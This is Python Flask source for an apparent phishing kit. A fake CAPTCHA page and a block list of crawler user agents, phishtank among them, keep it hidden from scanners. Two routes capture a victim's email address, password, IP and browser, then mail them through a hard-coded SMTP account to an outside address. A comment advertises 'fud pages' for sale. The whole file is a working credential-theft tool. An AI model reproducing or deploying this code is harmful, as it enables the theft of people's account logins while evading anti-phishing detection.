from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
import secrets
import os
import socket
from flask_redis import FlaskRedis
import random
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["40 per day", "40 per hour"])
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx

# Configure Redis for session storage
app.config['REDIS_URL'] = 'redis://localhost:6379/0'
redis_store = FlaskRedis(app)

bot_user_agents = [
'Googlebot', 
'Baiduspider', 
'ia_archiver',
'R6_FeedFetcher', 
'NetcraftSurveyAgent', 
'Sogou web spider',
'bingbot', 
'Yahoo! Slurp', 
'facebookexternalhit', 
'PrintfulBot',
'msnbot', 
'Twitterbot', 
'UnwindFetchor', 
'urlresolver', 
'Butterfly', 
'TweetmemeBot',
'PaperLiBot',
'MJ12bot',
'AhrefsBot',
'Exabot',
'Ezooms',
'YandexBot',
'SearchmetricsBot',
'phishtank',
'PhishTank',
'picsearch',
'TweetedTimes Bot',
'QuerySeekerSpider',
'ShowyouBot',
'woriobot',
'merlinkbot',
'BazQuxBot',
'Kraken',
'SISTRIX Crawler',
'R6_CommentReader',
'magpie-crawler',
'GrapeshotCrawler',
'PercolateCrawler',
'MaxPointCrawler',
'R6_FeedFetcher',
'NetSeer crawler',
'grokkit-crawler',
'SMXCrawler',
'PulseCrawler',
'Y!J-BRW',
'80legs.com/webcrawler',
'Mediapartners-Google', 
'Spinn3r', 
'InAGist', 
'Python-urllib', 
'NING', 
'TencentTraveler',
'Feedfetcher-Google', 
'mon.itor.us', 
'spbot', 
'Feedly',
'bot',
'curl',
"spider",
"crawler"
]



@app.route('/', methods=['GET', 'POST'])
def captcha():
    if request.method == 'GET':
        if redis_store.exists('passed_captcha') and redis_store.get('passed_captcha') == 'True':
            # CAPTCHA has already been passed, redirect to success page
            return redirect(url_for('success'))

        code = random.randint(1000, 9999)
        colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
        color = random.choice(colors)
        redis_store.set('code', str(code))
        userauto = request.args.get("web")
        userdomain = userauto[userauto.index('@') + 1:]
        redis_store.set('eman', userauto)
        redis_store.set('ins', userdomain)
        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)

    elif request.method == 'POST':
        user_input = request.form['code']
        if user_input == redis_store.get('code'):
            # User input matches the code, set the flag and redirect to success page
            redis_store.set('passed_captcha', 'True')
            return redirect(url_for('success'))
        else:
            code = random.randint(1000, 9999)
            colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
            color = random.choice(colors)
            redis_store.set('code', str(code))
            return render_template('captcha.html', code=code, color=color, error=True)


@app.route('/success')
def success():
    if 'passed_captcha' in session and session['passed_captcha']:
        web_param = request.args.get('web')
        return redirect(url_for('route2', web=web_param))
    else:
        return redirect(url_for('captcha'))


@app.route("/route2")
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        session['ins'] = web_param[web_param.index('@') + 1:]
    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))


@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "ghost@newupdateishere.com"
        receiver_email = "sharod.cabe@madeforthat.org"
        password = "yhG]rLZwK1!)"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "NEW YANKEE API ... 1"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP("mail.newupdateishere.com", 587) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        return redirect(url_for('benza', web=session.get('eman')))



@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "ghost@newupdateishere.com"
        receiver_email = "sharod.cabe@madeforthat.org"
        password = "yhG]rLZwK1!)"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "NEW YANKEE API ... 2"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP("mail.newupdateishere.com", 587) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        return redirect(url_for('lasmo'))



@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)

@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in bot_user_agents:
        abort(403)  # forbidden
    
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=3000)
